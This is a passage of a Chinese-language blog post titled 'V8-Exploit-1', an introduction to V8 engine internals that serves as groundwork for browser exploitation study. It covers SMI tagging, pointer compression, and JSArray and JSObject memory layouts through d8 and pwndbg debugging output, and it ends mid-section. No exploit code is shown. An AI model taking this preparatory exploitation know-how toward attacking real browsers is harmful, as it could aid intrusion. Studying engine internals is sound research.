<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="v8入门">
<meta property="og:type" content="website">
<meta property="og:title" content="V8-Exploit-1">
<meta property="og:url" content="https://ldrx30.github.io/todo/V8-Exploit-1.html">
<meta property="og:site_name" content="ldrx30">
<meta property="og:description" content="v8入门">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2024-09-06T14:07:29.999Z">
<meta property="article:modified_time" content="2024-09-06T14:07:29.999Z">
<meta property="article:author" content="ldrx30">
<meta property="article:tag" content="v8">
<meta name="twitter:card" content="summary">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>V8-Exploit-1</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.2.0"></head>

<body class="max-width mx-auto px3 ltr">
    
    <div class="content index py4 ">
        
          <header id="header">
  <a class="u-url u-uid" href="/">
  
    
      <img id="logo" alt class="u-logo" src="/images/logo.png" />
    
  
    <div id="title">
      <h1 class="p-name">ldrx30</h1>
    </div>
  </a>
  <div id="nav">
    <ul>
      <li class="icon">
        <a href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-2x"></i></a>
      </li>
      <!--
     --><li><a href="/">Home</a></li><!--
   --><!--
     --><li><a href="/about/">About</a></li><!--
   --><!--
     --><li><a href="/archives/">Writing</a></li><!--
   --><!--
     --><li><a target="_blank" rel="noopener" href="https://github.com/ldrx30">Projects</a></li><!--
   -->
    </ul>
  </div>
</header>

        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  

  <div class="content" itemprop="articleBody">
      
          <blockquote>
<p>v8入门</p>
</blockquote>
<span id="more"></span>

<p>是的，v8发动机，当活塞上升接近上止点时，火花塞点燃精心压缩的可燃混合气，瞬间燃烧的能量驱动气缸内压力飙升，温度急剧上升。在高压气体的推动下，活塞向下止点移动，这一过程由连杆传递力给曲轴，使其旋转并转化为机械能，完成一次能量转换。</p>
<h2 id="V8"><a href="#V8" class="headerlink" title="V8"></a>V8</h2><p>比较全的系列：<a target="_blank" rel="noopener" href="https://jhalon.github.io/chrome-browser-exploitation-1/">Chrome Browser Exploitation, Part 1: Introduction to V8 and JavaScript Internals</a></p>
<p>v8是chorme浏览器JS解释器</p>
<p>一些概念，蛮有趣的<br>v8: JS引擎（有八个气缸的V型发动机<br>Ignition: JS interpreter，AST-&gt;字节码（点火<br>Sparkplug: a non-optimizing JavaScript compiler（火花塞<br>Maglev: middle Optimizing JIT（磁悬浮<br>Turbofan: optimizing compilers, JIT（涡轮风扇发动机</p>
<p>build d8: <a target="_blank" rel="noopener" href="https://v8.dev/docs/build">Building V8 from source · V8</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ninja -C out/x64.release d8</span><br></pre></td></tr></table></figure>

<p>删除</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gn clean out/x64.release</span><br></pre></td></tr></table></figure>

<h3 id="pipeline"><a href="#pipeline" class="headerlink" title="pipeline"></a>pipeline</h3><p>简短介绍</p>
<h3 id="Object"><a href="#Object" class="headerlink" title="Object"></a>Object</h3><p><a target="_blank" rel="noopener" href="https://v8docs.nodesource.com/node-7.10/db/d85/classv8_1_1_object.html">v8: Object Class Reference</a></p>
<p><code>SMI</code>和<code>Object</code>：v8使用最后一位是否为1进行判断</p>
<ul>
<li>1: HeapObject，因此在查看内存布局时需要减去1</li>
<li>0: SMI，具体的值需要右移1位</li>
</ul>
<p>内存布局:<a target="_blank" rel="noopener" href="https://www.zhihu.com/column/p/28780798">奇技淫巧学 V8 之二，对象在 V8 内的表达</a></p>
<h4 id="SMI"><a href="#SMI" class="headerlink" title="SMI"></a>SMI</h4><p>SMI: 32bit小整数</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">d8&gt; <span class="built_in">let</span> a = 1</span><br><span class="line">undefined</span><br><span class="line">d8&gt; %DebugPrint(a)</span><br><span class="line">DebugPrint: Smi: 0x1 (1)</span><br><span class="line"></span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<p>浮点数</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">d8&gt; b = 1.1</span><br><span class="line">1.1</span><br><span class="line">d8&gt; %DebugPrint(b)</span><br><span class="line">DebugPrint: 0x346000da819: [HeapNumber] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: 0x0346000007b1 &lt;Map[12](HEAP_NUMBER_TYPE)&gt;</span><br><span class="line"> - value: 1.1</span><br><span class="line">0x346000007b1: [Map] <span class="keyword">in</span> ReadOnlySpace</span><br><span class="line"> - map: 0x0346000004c5 &lt;MetaMap (0x03460000007d &lt;null&gt;)&gt;</span><br><span class="line"> - <span class="built_in">type</span>: HEAP_NUMBER_TYPE</span><br><span class="line"> - instance size: 12</span><br><span class="line"> - elements kind: HOLEY_ELEMENTS</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x034600000061 &lt;undefined&gt;</span><br><span class="line"> - prototype_validity cell: 0</span><br><span class="line"> - instance descriptors (own) <span class="comment">#0: 0x034600000701 &lt;DescriptorArray[0]&gt;</span></span><br><span class="line"> - prototype: 0x03460000007d &lt;null&gt;</span><br><span class="line"> - constructor: 0x03460000007d &lt;null&gt;</span><br><span class="line"> - dependent code: 0x0346000006dd &lt;Other heap object (WEAK_ARRAY_LIST_TYPE)&gt;</span><br><span class="line"> - construction counter: 0</span><br><span class="line"></span><br><span class="line">1.1</span><br></pre></td></tr></table></figure>

<p>内存区域</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x346000da819</span><br><span class="line">0x346000da819: [HeapNumber] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: 0x0346000007b1 &lt;Map[12](HEAP_NUMBER_TYPE)&gt;</span><br><span class="line"> - value: 1.1</span><br><span class="line">pwndbg&gt; x/20wx 0x346000da819-1</span><br><span class="line">0x346000da818:	0x000007b1	0x9999999a	0x3ff19999</span><br></pre></td></tr></table></figure>

<p>查看内存布局，为什么前8字节不是 <code>0x0346000007b1</code>？因为V8使用了<strong>指针压缩</strong>的技术</p>
<p><strong>指针压缩</strong>：在一个isolate中，高32位都是一致的，如果我们存储的话，比较浪费空间，因此只保留低32位。</p>
<p>isolate的地址可以在r14寄存器看到</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">R14  0x34600000000</span><br></pre></td></tr></table></figure>

<p>如下就是在同一个4G的isolate中</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA</span><br><span class="line">             Start                End Perm     Size Offset File</span><br><span class="line">     0x34600000000      0x34600010000 r--p    10000      0 [anon_34600000]</span><br><span class="line">     0x34600010000      0x34600020000 ---p    10000      0 [anon_34600010]</span><br><span class="line">     0x34600020000      0x34600040000 r--p    20000      0 [anon_34600020]</span><br><span class="line">     0x34600040000      0x3460008b000 rw-p    4b000      0 [anon_34600040]</span><br><span class="line">     0x3460008b000      0x346000c0000 ---p    35000      0 [anon_3460008b]</span><br><span class="line">     0x346000c0000      0x34600100000 rw-p    40000      0 [anon_346000c0]</span><br><span class="line">     0x34600100000      0x34600180000 ---p    80000      0 [anon_34600100]</span><br><span class="line">     0x34600180000      0x346001c0000 r--p    40000      0 [anon_34600180]</span><br><span class="line">     0x346001c0000      0x34600200000 rw-p    40000      0 [anon_346001c0]</span><br><span class="line">     0x34600200000      0x34600240000 r--p    40000      0 [anon_34600200]</span><br><span class="line">     0x34600240000      0x34600280000 rw-p    40000      0 [anon_34600240]</span><br><span class="line">     0x34600280000      0x346002c0000 r--p    40000      0 [anon_34600280]</span><br><span class="line">     0x346002c0000      0x34600300000 rw-p    40000      0 [anon_346002c0]</span><br><span class="line">     0x34600300000      0x3460033d000 r--p    3d000      0 [anon_34600300]</span><br><span class="line">     0x3460033d000      0x34600340000 ---p     3000      0 [anon_3460033d]</span><br></pre></td></tr></table></figure>

<h4 id="HeapObject"><a href="#HeapObject" class="headerlink" title="HeapObject"></a>HeapObject</h4><h5 id="JSArray"><a href="#JSArray" class="headerlink" title="JSArray"></a>JSArray</h5><p>比如说</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">d8&gt; <span class="built_in">let</span> b = [1, 2, 3.3]</span><br><span class="line">undefined</span><br><span class="line">d8&gt; %DebugPrint(b)</span><br><span class="line">DebugPrint: 0x346001cc2d9: [JSArray]</span><br><span class="line"> - map: 0x0346000cefc1 &lt;Map[16](PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x0346000ce935 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x0346001cc2b9 &lt;FixedDoubleArray[3]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x0346000006cd &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    0x34600000d41: [String] <span class="keyword">in</span> ReadOnlySpace: <span class="comment">#length: 0x03460030f82d &lt;AccessorInfo name= 0x034600000d41 &lt;String[6]: #length&gt;, data= 0x034600000061 &lt;undefined&gt;&gt; (const accessor descriptor), location: descriptor</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x0346001cc2b9 &lt;FixedDoubleArray[3]&gt; &#123;</span><br><span class="line">           0: 1</span><br><span class="line">           1: 2</span><br><span class="line">           2: 3.3</span><br><span class="line"> &#125;</span><br><span class="line">0x346000cefc1: [Map] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: 0x0346000c3c39 &lt;MetaMap (0x0346000c3c89 &lt;NativeContext[285]&gt;)&gt;</span><br><span class="line"> - <span class="built_in">type</span>: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: 16</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - elements kind: PACKED_DOUBLE_ELEMENTS</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - back pointer: 0x0346000cef81 &lt;Map[16](HOLEY_SMI_ELEMENTS)&gt;</span><br><span class="line"> - prototype_validity cell: 0x034600000a31 &lt;Cell value= 1&gt;</span><br><span class="line"> - instance descriptors <span class="comment">#1: 0x0346000cef4d &lt;DescriptorArray[1]&gt;</span></span><br><span class="line"> - transitions <span class="comment">#1: 0x0346000cefe9 &lt;TransitionArray[4]&gt;Transition array #1:</span></span><br><span class="line">     0x034600000e05 &lt;Symbol: (elements_transition_symbol)&gt;: (transition to HOLEY_DOUBLE_ELEMENTS) -&gt; 0x0346000cf001 &lt;Map[16](HOLEY_DOUBLE_ELEMENTS)&gt;</span><br><span class="line"></span><br><span class="line"> - prototype: 0x0346000ce935 &lt;JSArray[0]&gt;</span><br><span class="line"> - constructor: 0x0346000ce62d &lt;JSFunction Array (sfi = 0x34600335ed9)&gt;</span><br><span class="line"> - dependent code: 0x0346000006dd &lt;Other heap object (WEAK_ARRAY_LIST_TYPE)&gt;</span><br><span class="line"> - construction counter: 0</span><br><span class="line"></span><br><span class="line">[1, 2, 3.3]</span><br></pre></td></tr></table></figure>

<p>在看看内存布局</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/8wx 0x346001cc2d9-1</span><br><span class="line">0x346001cc2d8:	0x000cefc1	0x000006cd	0x001cc2b9	0x00000006</span><br><span class="line">0x346001cc2e8:	0x00000105	0x7d521c96	0x0000000e	0x62654425</span><br></pre></td></tr></table></figure>

<p>JSArray如下的结构</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+--------------+</span><br><span class="line">|     map      |</span><br><span class="line">+--------------+</span><br><span class="line">|  properties  |</span><br><span class="line">+--------------+</span><br><span class="line">|   elements   |</span><br><span class="line">+--------------+</span><br><span class="line">|   length     |</span><br><span class="line">+--------------+</span><br></pre></td></tr></table></figure>

<p>elements: 使用下标取值，放在 <code>element</code> 中，这里也将1转化成为浮点数。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20wx 0x0346001cc2b9-1</span><br><span class="line">0x346001cc2b8:	0x00000851	0x00000006	0x00000000	0x3ff00000</span><br><span class="line">0x346001cc2c8:	0x00000000	0x40000000	0x66666666	0x400a6666</span><br><span class="line">0x346001cc2d8:	0x000cefc1	0x000006cd	0x001cc2b9	0x00000006</span><br><span class="line">0x346001cc2e8:	0x00000105	0x7d521c96	0x0000000e	0x62654425</span><br><span class="line">+-----------+</span><br><span class="line">|   map     |</span><br><span class="line">+-----------+</span><br><span class="line">|   b[0]    |</span><br><span class="line">+-----------+</span><br><span class="line">|   ...     |</span><br></pre></td></tr></table></figure>

<p>length：代表element的长度，是SMI</p>
<p>JSArray是<strong>先初始化elements在初始化object</strong>，也可以看到其后面就是<code>Object b</code>的起始地址</p>
<h5 id="JSObject"><a href="#JSObject" class="headerlink" title="JSObject"></a>JSObject</h5><p>In-Object：初始化</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">d8&gt; <span class="built_in">let</span> c = &#123;<span class="string">&quot;a&quot;</span>: 1, <span class="string">&quot;b&quot;</span>: 2, <span class="string">&quot;c&quot;</span>:3&#125; </span><br><span class="line">undefined</span><br><span class="line">d8&gt; %DebugPrint(c)</span><br><span class="line">DebugPrint: 0x346001cc825: [JS_OBJECT_TYPE]</span><br><span class="line"> - map: 0x0346000dbcc9 &lt;Map[24](HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x0346000c4b21 &lt;Object map = 0x346000c415d&gt;</span><br><span class="line"> - elements: 0x0346000006cd &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - properties: 0x0346000006cd &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    0x34600002a49: [String] <span class="keyword">in</span> ReadOnlySpace: <span class="comment">#a: 1 (const data field 0), location: in-object</span></span><br><span class="line">    0x34600002a59: [String] <span class="keyword">in</span> ReadOnlySpace: <span class="comment">#b: 2 (const data field 1), location: in-object</span></span><br><span class="line">    0x34600002a69: [String] <span class="keyword">in</span> ReadOnlySpace: <span class="comment">#c: 3 (const data field 2), location: in-object</span></span><br><span class="line"> &#125;</span><br><span class="line">0x346000dbcc9: [Map] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: 0x0346000c3c39 &lt;MetaMap (0x0346000c3c89 &lt;NativeContext[285]&gt;)&gt;</span><br><span class="line"> - <span class="built_in">type</span>: JS_OBJECT_TYPE</span><br><span class="line"> - instance size: 24</span><br><span class="line"> - inobject properties: 3</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - elements kind: HOLEY_ELEMENTS</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x0346000dbca1 &lt;Map[24](HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - prototype_validity cell: 0x034600000a31 &lt;Cell value= 1&gt;</span><br><span class="line"> - instance descriptors (own) <span class="comment">#3: 0x0346001cc881 &lt;DescriptorArray[3]&gt;</span></span><br><span class="line"> - prototype: 0x0346000c4b21 &lt;Object map = 0x346000c415d&gt;</span><br><span class="line"> - constructor: 0x0346000c4665 &lt;JSFunction Object (sfi = 0x346003354b9)&gt;</span><br><span class="line"> - dependent code: 0x0346000006dd &lt;Other heap object (WEAK_ARRAY_LIST_TYPE)&gt;</span><br><span class="line"> - construction counter: 0</span><br><span class="line"></span><br><span class="line">&#123;a: 1, b: 2, c: 3&#125;</span><br></pre></td></tr></table></figure>

<p>map.inobject_properties：初始化的元素个数，没有开辟新的空间。</p>
<p>元素描述符: <code>map.instance_descriptors</code>寻找</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x0346001cc881</span><br><span class="line">0x346001cc881: [DescriptorArray]</span><br><span class="line"> - map: 0x03460000062d &lt;Map(DESCRIPTOR_ARRAY_TYPE)&gt;</span><br><span class="line"> - enum_cache: 3</span><br><span class="line">   - keys: 0x0346000dbded &lt;FixedArray[3]&gt;</span><br><span class="line">   - indices: 0x0346000dbe01 &lt;FixedArray[3]&gt;</span><br><span class="line"> - nof slack descriptors: 0</span><br><span class="line"> - nof descriptors: 3</span><br><span class="line"> - raw gc state: mc epoch 0, marked 0, delta 0</span><br><span class="line">  [0]: 0x34600002a49: [String] <span class="keyword">in</span> ReadOnlySpace: <span class="comment">#a (const data field 0:s, p: 2, attrs: [WEC]) @ Any</span></span><br><span class="line">  [1]: 0x34600002a59: [String] <span class="keyword">in</span> ReadOnlySpace: <span class="comment">#b (const data field 1:s, p: 1, attrs: [WEC]) @ Any</span></span><br><span class="line">  [2]: 0x34600002a69: [String] <span class="keyword">in</span> ReadOnlySpace: <span class="comment">#c (const data field 2:s, p: 0, attrs: [WEC]) @ Any</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; job 0x0346000dbded</span><br><span class="line">0x346000dbded: [FixedArray] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: 0x034600000565 &lt;Map(FIXED_ARRAY_TYPE)&gt;</span><br><span class="line"> - length: 3</span><br><span class="line">           0: 0x034600002a49 &lt;String[1]: <span class="comment">#a&gt;</span></span><br><span class="line">           1: 0x034600002a59 &lt;String[1]: <span class="comment">#b&gt;</span></span><br><span class="line">           2: 0x034600002a69 &lt;String[1]: <span class="comment">#c&gt;</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; job 0x0346000dbe01</span><br><span class="line">0x346000dbe01: [FixedArray] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: 0x034600000565 &lt;Map(FIXED_ARRAY_TYPE)&gt;</span><br><span class="line"> - length: 3</span><br><span class="line">           0: 0</span><br><span class="line">           1: 2</span><br><span class="line">           2: 4</span><br></pre></td></tr></table></figure>

<p>当使用 <code>a.aaa</code> 进行赋值时，使用 <code>properties</code> 记录</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">d8&gt; <span class="built_in">let</span> a = &#123;<span class="string">&quot;x&quot;</span>:1, <span class="string">&quot;y&quot;</span>:2&#125;</span><br><span class="line">undefined</span><br><span class="line">d8&gt; %DebugPrint(a)</span><br><span class="line">DebugPrint: 0x2098001ca101: [JS_OBJECT_TYPE]</span><br><span class="line"> - map: 0x2098000da8e5 &lt;Map[20](HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x2098000c4b21 &lt;Object map = 0x2098000c415d&gt;</span><br><span class="line"> - elements: 0x2098000006cd &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - properties: 0x2098000006cd &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    0x209800002bb9: [String] <span class="keyword">in</span> ReadOnlySpace: <span class="comment">#x: 1 (const data field 0), location: in-object</span></span><br><span class="line">    0x209800002bc9: [String] <span class="keyword">in</span> ReadOnlySpace: <span class="comment">#y: 2 (const data field 1), location: in-object</span></span><br><span class="line"> &#125;</span><br><span class="line">0x2098000da8e5: [Map] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: 0x2098000c3c39 &lt;MetaMap (0x2098000c3c89 &lt;NativeContext[285]&gt;)&gt;</span><br><span class="line"> - <span class="built_in">type</span>: JS_OBJECT_TYPE</span><br><span class="line"> - instance size: 20</span><br><span class="line"> - inobject properties: 2</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - elements kind: HOLEY_ELEMENTS</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x2098000da89d &lt;Map[20](HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - prototype_validity cell: 0x209800000a31 &lt;Cell value= 1&gt;</span><br><span class="line"> - instance descriptors (own) <span class="comment">#2: 0x2098001ca131 &lt;DescriptorArray[2]&gt;</span></span><br><span class="line"> - prototype: 0x2098000c4b21 &lt;Object map = 0x2098000c415d&gt;</span><br><span class="line"> - constructor: 0x2098000c4665 &lt;JSFunction Object (sfi = 0x2098003354b9)&gt;</span><br><span class="line"> - dependent code: 0x2098000006dd &lt;Other heap object (WEAK_ARRAY_LIST_TYPE)&gt;</span><br><span class="line"> - construction counter: 0</span><br><span class="line"></span><br><span class="line">&#123;x: 1, y: 2&#125;</span><br><span class="line">d8&gt; a.aaa = 333</span><br><span class="line">333</span><br><span class="line">d8&gt; %DebugPrint(a)</span><br><span class="line">DebugPrint: 0x2098001ca101: [JS_OBJECT_TYPE]</span><br><span class="line"> - map: 0x2098000db7a1 &lt;Map[20](HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x2098000c4b21 &lt;Object map = 0x2098000c415d&gt;</span><br><span class="line"> - elements: 0x2098000006cd &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - properties: 0x2098001cc051 &lt;PropertyArray[3]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    0x209800002bb9: [String] <span class="keyword">in</span> ReadOnlySpace: <span class="comment">#x: 1 (const data field 0), location: in-object</span></span><br><span class="line">    0x209800002bc9: [String] <span class="keyword">in</span> ReadOnlySpace: <span class="comment">#y: 2 (const data field 1), location: in-object</span></span><br><span class="line">    0x2098000db6d9: [String] <span class="keyword">in</span> OldSpace: <span class="comment">#aaa: 333 (const data field 2), location: properties[0]</span></span><br><span class="line"> &#125;</span><br><span class="line">0x2098000db7a1: [Map] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: 0x2098000c3c39 &lt;MetaMap (0x2098000c3c89 &lt;NativeContext[285]&gt;)&gt;</span><br><span class="line"> - <span class="built_in">type</span>: JS_OBJECT_TYPE</span><br><span class="line"> - instance size: 20</span><br><span class="line"> - inobject properties: 2</span><br><span class="line"> - unused property fields: 2</span><br><span class="line"> - elements kind: HOLEY_ELEMENTS</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x2098000da8e5 &lt;Map[20](HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - prototype_validity cell: 0x2098000db7c9 &lt;Cell value= 0&gt;</span><br><span class="line"> - instance descriptors (own) <span class="comment">#3: 0x2098001cc01d &lt;DescriptorArray[3]&gt;</span></span><br><span class="line"> - prototype: 0x2098000c4b21 &lt;Object map = 0x2098000c415d&gt;</span><br><span class="line"> - constructor: 0x2098000c4665 &lt;JSFunction Object (sfi = 0x2098003354b9)&gt;</span><br><span class="line"> - dependent code: 0x2098000006dd &lt;Other heap object (WEAK_ARRAY_LIST_TYPE)&gt;</span><br><span class="line"> - construction counter: 0</span><br><span class="line"></span><br><span class="line">&#123;x: 1, y: 2, aaa: 333&#125;</span><br></pre></td></tr></table></figure>

<p>查看</p>
